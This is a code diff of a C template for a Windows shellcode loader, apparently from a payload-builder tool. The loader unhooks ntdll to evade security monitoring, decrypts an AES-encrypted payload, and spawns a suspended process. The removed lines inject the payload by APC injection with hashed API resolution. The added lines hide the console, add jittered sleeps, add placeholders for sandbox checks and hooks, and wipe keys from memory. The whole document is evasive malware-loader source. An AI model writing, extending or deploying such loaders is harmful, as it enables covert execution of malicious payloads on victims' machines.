@@ -4,6 +4,8 @@
 #include "whispers.h"
 #include "functions.h"
 #include "AES_128_CBC.h"
+#include "sandbox.h"
+#include "trampoline.h"
 
 #define TARGET_PROCESS "#-TARGET_PROCESS-#"
 
@@ -12,7 +14,7 @@ uint8_t aes_k[16] = { #-KEY_VALUE-# };
 uint8_t aes_i[16] = { #-IV_VALUE-# };
 
 
-int main() {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
 	PBYTE		pEncPayload			= NULL;
 	SIZE_T		sEncPayload			= 0;
@@ -30,6 +32,9 @@ int main() {
 	NTSTATUS	STATUS				= 0x00;
 
 	
+	// Seed RNG for jittered sleep timing
+	srand((unsigned int)GetTickCount());
+	// #-SANDBOX_CHECK_CALL-#
 	//printf("[+] Un-hooking Ntdll \n");
 	LPVOID nt = MapNtdll();
 	if (!nt) 
@@ -37,8 +42,11 @@ int main() {
 
 	if (!Unhook(nt)) 
 		return -1;
+
+	// Install hooks AFTER unhooking so they don't get erased
+	// #-TRAMPOLINE_CALL-#
 	
-	Sleep(500);
+	JITTER_SLEEP(500);
 	if (!GetContent(&pEncPayload, &sEncPayload)) {
 
 		//printf("[-] Failed to get the data!\n");
@@ -51,7 +59,7 @@ int main() {
 	// Decryption routine
 	//printf("[i] Starting the decryption...\n");
 	
-	Sleep(500);
+	JITTER_SLEEP(500);
 	// Allocating memory to store the decrypted payload inside of pClearText
 	pClearText = (PBYTE)malloc(sEncPayload);
 	AES_DecryptInit(&ctx, aes_k, aes_i);
@@ -59,7 +67,7 @@ int main() {
 
 	//printf("\t[+] Payload decrypted at postion: 0x%p with size of %zu\n", pClearText, sEncPayload);
 
-	Sleep(1500);
+	JITTER_SLEEP(1500);
 	//printf("[i] Creating suspended process..\n");
 	// Creating a suspeneded process now
 	if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
@@ -69,36 +77,29 @@ int main() {
 	}
 	//printf("[+] Process created with PID: %d\n", dwProcessId);
 
-	Sleep(2500);
-	//printf("[i] Injecting the shellcode into the process..\n");
-	// Doing the APC Injection
-	if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess)) {
-
-		return -1;
-	}
-
-	Sleep(1500);
-	//printf("[i] Running the shellcode via NtQueueApcThread..\n");
-	// Running the thread via QueueAPCThread
-	if ((STATUS = NTQAT(hThread, pProcess, NULL, NULL, NULL)) != 0) {
-
-		//printf("[-] NtQueueApcThrad failed!\n");
-		return -1;
-	}
+	JITTER_SLEEP(2500);
+	// #-INJECTION_METHOD_PLACEHOLDER-#
 	
-	// API Hashing
-	cDAPS cDAPSu = (cDAPS) GetProcAddressH(GetModuleHandleH(#-KERNELBASE_VALUE-#), #-DAPS_VALUE-#);
-
-	//printf("[i] Position of DAPsu: 0x%p\n", cDAPSu);
-
-	Sleep(1000);
-	// Stopping the debugging of the process, which launches the payload
-	cDAPSu(dwProcessId);
-	//printf("[+] Payload executed!\n");
+	// Cleanup: Zero out sensitive data before freeing
+	if (pEncPayload) {
+		SecureZeroMemory(pEncPayload, sEncPayload);
+		free(pEncPayload);
+		pEncPayload = NULL;
+	}
+	if (pClearText) {
+		SecureZeroMemory(pClearText, sEncPayload);
+		free(pClearText);
+		pClearText = NULL;
+	}
+	// Zero out encryption keys
+	SecureZeroMemory(aes_k, sizeof(aes_k));
+	SecureZeroMemory(aes_i, sizeof(aes_i));
+	SecureZeroMemory(&ctx, sizeof(ctx));
 	
-	CloseHandle(hThread);
-	CloseHandle(hProcess);
-	free(pClearText);
+	if (hThread)
+		CloseHandle(hThread);
+	if (hProcess)
+		CloseHandle(hProcess);
 
 	return 0;
 }
